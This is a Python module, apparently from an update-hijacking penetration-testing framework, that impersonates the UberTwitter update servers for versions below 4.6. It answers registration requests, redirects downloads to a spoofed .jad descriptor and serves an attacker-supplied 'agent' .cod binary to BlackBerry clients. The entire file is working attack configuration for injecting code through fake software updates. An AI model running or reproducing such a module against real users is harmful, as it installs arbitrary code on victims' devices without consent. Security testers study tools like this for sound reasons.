from modules import ModuleBase


class UberTwitter(ModuleBase):
    name = 'UberTwitter'
    version = '1.0'
    appver = '< 4.6 (0.971)'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(reg3.ubertwitter.com|reg2.ubertwitter.com)'
    agent_filename = './agent/EkopartyWebIcon.cod'
    enabled = False
    options = {
        'version': {
            'val': "7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '/do_reg.php',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/ubertwitter/update',
        }, {
            'path': '/download.php',
            'type': 'redirect',
            'location': 'http://reg2.ubertwitter.com/update<%RND1%>.jad',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': ''
        }, {
            'path': '.jad',
            'type': 'file',
            'headers': {'content-type': 'text/vnd.sun.j2me.app-descriptor'},
            'method': '',
            'bin': '',
            'string': '',
            'parse': 0,
            'file': './agent/EkopartyWebIcon.jad'
        }, {
            'path': '.cod',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]